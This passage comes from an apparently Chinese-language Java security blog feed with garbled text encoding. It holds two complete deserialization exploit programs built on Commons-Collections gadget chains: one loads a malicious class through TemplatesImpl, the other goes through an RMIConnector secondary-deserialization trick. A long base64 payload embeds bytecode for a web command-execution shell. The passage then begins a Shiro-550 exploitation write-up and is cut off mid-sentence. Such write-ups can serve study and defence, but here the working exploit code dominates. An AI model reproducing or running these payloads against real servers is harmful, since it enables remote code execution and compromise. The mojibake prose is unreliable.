org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exp1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c1</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\BadClass\\Evil.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        bytecodesField.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">InstantiateTransformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                instantiateTransformer</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(map,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map2 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map2.put(tiedMapEntry,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        lazyMap.remove(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c2</span> <span class="operator">=</span> LazyMap.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">factories</span> <span class="operator">=</span> c2.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factories.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factories.set(lazyMap,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        serialize(map2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        os.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æŠŠ<code>ser.bin</code>base64ä¸€ä¸‹ä¼ åˆ°<code>/stub</code></p><p><strong>Exp2</strong>(äºŒæ¬¡ååºåˆ—åŒ–)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.remote.JMXServiceURL;</span><br><span class="line"><span class="keyword">import</span> javax.management.remote.rmi.RMIConnector;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Hello world!</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exp</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">( String[] args )</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">RMIConnector</span> <span class="variable">rmiConnector</span> <span class="operator">=</span> (RMIConnector) getObject();</span><br><span class="line"><span class="comment">//        rmiConnector.connect();</span></span><br><span class="line"></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;connect&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, rmiConnector);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map2 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map2.put(tiedMapEntry, <span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        lazyMap.remove(rmiConnector);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> LazyMap.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">factoryField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factoryField.set(lazyMap,invokerTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objOut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;aser.bin&quot;</span>));</span><br><span class="line">        objOut.writeUTF(<span class="string">&quot;SJTU&quot;</span>);</span><br><span class="line">        objOut.writeInt(<span class="number">1896</span>);</span><br><span class="line">        objOut.writeObject(map2);</span><br><span class="line">        objOut.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getObject</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">JMXServiceURL</span> <span class="variable">jmxServiceURL</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JMXServiceURL</span>(<span class="string">&quot;service:jmx:iiop:///stub/rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IANG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5rZXl2YWx1ZS5UaWVkTWFwRW50cnmKrdKbOcEf2wIAAkwAA2tleXQAEkxqYXZhL2xhbmcvT2JqZWN0O0wAA21hcHQAD0xqYXZhL3V0aWwvTWFwO3hwdAADYWFhc3IAKm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5tYXAuTGF6eU1hcG7llIKeeRCUAwABTAAHZmFjdG9yeXQALExvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNoYWluZWRUcmFuc2Zvcm1lcjDHl+woepcEAgABWwANaVRyYW5zZm9ybWVyc3QALVtMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwdXIALVtMb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLlRyYW5zZm9ybWVyO71WKvHYNBiZAgAAeHAAAAACc3IAO29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5Db25zdGFudFRyYW5zZm9ybWVyWHaQEUECsZQCAAFMAAlpQ29uc3RhbnRxAH4AA3hwdnIAN2NvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRyQVhGaWx0ZXIAAAAAAAAAAAAAAHhwc3IAPm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5JbnN0YW50aWF0ZVRyYW5zZm9ybWVyNIv0f6SG0DsCAAJbAAVpQXJnc3QAE1tMamF2YS9sYW5nL09iamVjdDtbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAXNyADpjb20uc3VuLm9yZy5hcGFjaGUueGFsYW4uaW50ZXJuYWwueHNsdGMudHJheC5UZW1wbGF0ZXNJbXBsCVdPwW6sqzMDAAZJAA1faW5kZW50TnVtYmVySQAOX3RyYW5zbGV0SW5kZXhbAApfYnl0ZWNvZGVzdAADW1tCWwAGX2NsYXNzcQB+ABVMAAVfbmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO0wAEV9vdXRwdXRQcm9wZXJ0aWVzdAAWTGphdmEvdXRpbC9Qcm9wZXJ0aWVzO3hwAAAAAP////91cgADW1tCS/0ZFWdn2zcCAAB4cAAAAAF1cgACW0Ks8xf4BghU4AIAAHhwAAAOT8r+ur4AAAA0ALkKAC8AXwoAYABhCgBgAGIIAGMKAGQAZQgAZgcAZwoABwBoBwBpCgBqAGsIAGwIAG0IAG4IAG8IAE0KAAcAcAgAcQgATgcAcgoAagBzCABQCAB0CgB1AHYKABMAdwgAeAoAEwB5CAB6CAB7CgATAHwIAH0IAH4IAH8IAIAKAAkAgQgAggcAgwoAhACFCgCEAIYKAIcAiAoAJACJCACKCgAkAIsKACQAjAgAjQgAjgcAjwcAkAEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQASTG9yZy9leGFtcGxlL0V2aWw7AQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHAJEBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEABjxpbml0PgEAAygpVgEAAWMBABFMamF2YS9sYW5nL0NsYXNzOwEAAW0BABpMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEAAW8BABJMamF2YS9sYW5nL09iamVjdDsBAAJtMQEABHJlc3ABAANyZXEBAAlnZXRXcml0ZXIBAAlnZXRIZWFkZXIBAAZ3cml0ZXIBAANjbWQBABJMamF2YS9sYW5nL1N0cmluZzsBAAhjb21tYW5kcwEAE1tMamF2YS9sYW5nL1N0cmluZzsBAAtjaGFyc2V0TmFtZQEADVN0YWNrTWFwVGFibGUHAI8HAGcHAJIHAGkHAHIHAFMHAJMBAApTb3VyY2VGaWxlAQAJRXZpbC5qYXZhDABCAEMHAJQMAJUAlgwAlwCYAQA8b3JnLnNwcmluZ2ZyYW1ld29yay53ZWIuY29udGV4dC5yZXF1ZXN0LlJlcXVlc3RDb250ZXh0SG9sZGVyBwCZDACaAJsBABRnZXRSZXF1ZXN0QXR0cmlidXRlcwEAD2phdmEvbGFuZy9DbGFzcwwAnACdAQAQamF2YS9sYW5nL09iamVjdAcAkgwAngCfAQBAb3JnLnNwcmluZ2ZyYW1ld29yay53ZWIuY29udGV4dC5yZXF1ZXN0LlNlcnZsZXRSZXF1ZXN0QXR0cmlidXRlcwEAC2dldFJlc3BvbnNlAQAKZ2V0UmVxdWVzdAEAHWphdmF4LnNlcnZsZXQuU2VydmxldFJlc3BvbnNlDACgAJ0BACVqYXZheC5zZXJ2bGV0Lmh0dHAuSHR0cFNlcnZsZXRSZXF1ZXN0AQAQamF2YS9sYW5nL1N0cmluZwwAoQCiAQAHb3MubmFtZQcAowwApAClDACmAKcBAAZ3aW5kb3cMAKgAqQEAA0dCSwEABVVURi04DACqAKcBAANXSU4BAAIvYwEABy9iaW4vc2gBAAItYwwAqwCsAQAHcHJpbnRsbgEAEWphdmEvdXRpbC9TY2FubmVyBwCtDACuAK8MALAAsQcAsgwAswC0DABCALUBAAJcQQwAtgC3DAC4AKcBAAVmbHVzaAEABWNsb3NlAQAQb3JnL2V4YW1wbGUvRXZpbAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQAQamF2YS9sYW5nL1RocmVhZAEADWN1cnJlbnRUaHJlYWQBABQoKUxqYXZhL2xhbmcvVGhyZWFkOwEAFWdldENvbnRleHRDbGFzc0xvYWRlcgEAGSgpTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBABVqYXZhL2xhbmcvQ2xhc3NMb2FkZXIBAAlsb2FkQ2xhc3MBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7AQAJZ2V0TWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAEWdldERlY2xhcmVkTWV0aG9kAQANc2V0QWNjZXNzaWJsZQEABChaKVYBABBqYXZhL2xhbmcvU3lzdGVtAQALZ2V0UHJvcGVydHkBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAC3RvTG93ZXJDYXNlAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgEAC3RvVXBwZXJDYXNlAQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7AQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBACooTGphdmEvaW8vSW5wdXRTdHJlYW07TGphdmEvbGFuZy9TdHJpbmc7KVYBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsBAARuZXh0ACEALgAvAAAAAAADAAEAMAAxAAIAMgAAAD8AAAADAAAAAbEAAAACADMAAAAGAAEAAAAQADQAAAAgAAMAAAABADUANgAAAAAAAQA3ADgAAQAAAAEAOQA6AAIAOwAAAAQAAQA8AAEAMAA9AAIAMgAAAEkAAAAEAAAAAbEAAAACADMAAAAGAAEAAAAVADQAAAAqAAQAAAABADUANgAAAAAAAQA3ADgAAQAAAAEAPgA/AAIAAAABAEAAQQADADsAAAAEAAEAPAABAEIAQwACADIAAALDAAkADQAAAXsqtwABuAACtgADEgS2AAVMKxIGA70AB7YACE0sAQO9AAm2AApOuAACtgADEgu2AAVMKxIMA70AB7YACE0rEg0DvQAHtgAIOgQsLQO9AAm2AAo6BRkELQO9AAm2AAo6BrgAArYAAxIOtgAFEg8DvQAHtgAQOge4AAK2AAMSEbYABRISBL0AB1kDEhNTtgAQOggZCAS2ABQZBwS2ABQZBxkFA70ACbYACjoJGQgZBgS9AAlZAxIVU7YACsAAEzoKBr0AEzoLEha4ABe2ABgSGbYAGpkACBIbpwAFEhw6DBIWuAAXtgAdEh62ABqZABIZCwMSFVMZCwQSH1OnAA8ZCwMSIFMZCwQSIVMZCwUZClMZCbYAIhIjBL0AB1kDEhNTtgAQGQkEvQAJWQO7ACRZuAAlGQu2ACa2ACcZDLcAKBIptgAqtgArU7YAClcZCbYAIhIsA70AB7YAEBkJA70ACbYAClcZCbYAIhItA70AB7YAEBkJA70ACbYAClexAAAAAwAzAAAAbgAbAAAAFgAEABcAEAAYABsAGQAlABoAMQAbADwAHABIAB0AUwAeAF8AHwB1ACAAkAAhAJYAIgCcACMAqQAkAL4AJQDEACYA3QAnAO0AKADzACkA/AArAQIALAEIAC4BDgAvAUoAMAFiADEBegAyADQAAACEAA0AAAF7ADUANgAAABABawBEAEUAAQAbAWAARgBHAAIAJQFWAEgASQADAEgBMwBKAEcABABTASgASwBJAAUAXwEcAEwASQAGAHUBBgBNAEcABwCQAOsATgBHAAgAqQDSAE8ASQAJAL4AvQBQAFEACgDEALcAUgBTAAsA3QCeAFQAUQAMAFUAAAA4AAT/ANkADAcAVgcAVwcAWAcAWQcAWAcAWQcAWQcAWAcAWAcAWQcAWgcAWwAAQQcAWvwAIAcAWgsAOwAAAAQAAQBcAAEAXQAAAAIAXnBxAH4ABnB3AQB4dXIAEltMamF2YS5sYW5nLkNsYXNzO6sW167LzVqZAgAAeHAAAAABdnIAHWphdmF4LnhtbC50cmFuc2Zvcm0uVGVtcGxhdGVzAAAAAAAAAAAAAAB4cHNxAH4AAD9AAAAAAAAMdwgAAAAQAAAAAHh4cQB+AAZ4&quot;</span>);</span><br><span class="line">        <span class="type">RMIConnector</span> <span class="variable">rmiConnector</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RMIConnector</span>(jmxServiceURL,<span class="keyword">new</span> <span class="title class_">HashMap</span>());</span><br><span class="line">        <span class="keyword">return</span> rmiConnector;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ€åå°†æ–°ç”Ÿæˆçš„<code>ser.bin</code>è½¬ä¸ºåå…­è¿›åˆ¶</p><p><a href="https://imgse.com/i/zlp2u9"><img src="https://s1.ax1x.com/2022/11/21/zlp2u9.png" alt="zlp2u9.png"></a></p>]]></content>
      
      
      <categories>
          
          <category> Javaå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> äºŒæ¬¡ååºåˆ—åŒ– </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Javaå®‰å…¨ä¹‹è·¯--Shiro550ååºåˆ—åŒ–</title>
      <link href="/2022/10/19/Shiro550-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2022/10/19/Shiro550-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="Shiro550-ååºåˆ—åŒ–"><a href="#Shiro550-ååºåˆ—åŒ–" class="headerlink" title="Shiro550-ååºåˆ—åŒ–"></a>Shiro550-ååºåˆ—åŒ–</h1><h2 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h2><p>Apache Shiro æ˜¯ Java çš„ä¸€ä¸ªå®‰å…¨æ¡†æ¶ã€‚Shiro å¯ä»¥éå¸¸å®¹æ˜“çš„å¼€å‘å‡ºè¶³å¤Ÿå¥½çš„åº”ç”¨ï¼Œå…¶ä¸ä»…å¯ä»¥ç”¨åœ¨ JavaSE ç¯å¢ƒï¼Œä¹Ÿå¯ä»¥ç”¨åœ¨ JavaEE ç¯å¢ƒã€‚Shiro å¯ä»¥å¸®åŠ©æˆ‘ä»¬å®Œæˆï¼šè®¤è¯ã€æˆæƒã€åŠ å¯†ã€ä¼šè¯ç®¡ç†ã€ä¸ Web é›†æˆã€ç¼“å­˜ç­‰ã€‚</p><h2 id="æ¼æ´åŸç†"><a href="#æ¼æ´åŸç†" class="headerlink" title="æ¼æ´åŸç†"></a>æ¼æ´åŸç†</h2><p>Shiro 550 ååºåˆ—åŒ–æ¼æ´å­˜åœ¨ç‰ˆæœ¬ï¼šshiro &lt;1.2.4ï¼Œäº§ç”ŸåŸå› æ˜¯å› ä¸ºshiroæ¥å—äº†Cookieé‡Œé¢<code>rememberMe</code>çš„å€¼ï¼Œç„¶åå»è¿›è¡ŒBase64è§£å¯†åï¼Œå†ä½¿ç”¨aeså¯†é’¥è§£å¯†åçš„æ•°æ®ï¼Œè¿›è¡Œååºåˆ—åŒ–ã€‚</p><p>æ‰€ä»¥æ„é€ è¯¥å€¼ä¸ºä¸€æ¡æ¶æ„javaååºåˆ—åŒ–é“¾ï¼Œå†å¯¹è¯¥å€¼è¿›è¡Œè¯¥å¯†é’¥aesåŠ å¯†åè¿›è¡Œbase64åŠ å¯†ï¼Œé‚£ä¹ˆè¿™æ—¶å€™å°±ä¼šå»ååºåˆ—åŒ–æ‰€ä¼ å…¥çš„payloadï¼Œæ‰§è¡Œæ”»å‡»</p><p><strong>æµç¨‹</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è·å–rememberMeå€¼ -&gt; Base64è§£å¯† -&gt; AESè§£å¯† -&gt; è°ƒç”¨readobjectååºåˆ—åŒ–æ“ä½œ</span><br></pre></td></tr></table></figure><h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><p><strong>æ¼æ´ç¯å¢ƒ</strong>ï¼š<a href="https://codeload.github.com/apache/shiro/zip/shiro-root-1.2.4">https://codeload.github.com/apache/shiro/zip/shiro-root-1.2.4</a></p><h3 id="é…ç½®ä¾èµ–"><a href="#é…ç½®ä¾èµ–" class="headerlink" title="é…ç½®ä¾èµ–"></a>é…ç½®ä¾èµ–</h3><p>ä¿®æ”¹<code>/samples/web/pom.xml</code>,æ·»åŠ <code>cc4</code>å’Œ<code>jstl</code>ä¾èµ–</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jstl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--  è¿™é‡Œéœ€è¦å°†jstlè®¾ç½®ä¸º1.2 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections4<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="é…ç½®jdk1-6"><a href="#é…ç½®jdk1-6" class="headerlink" title="é…ç½®jdk1.6"></a>é…ç½®jdk1.6</h3><p>å› 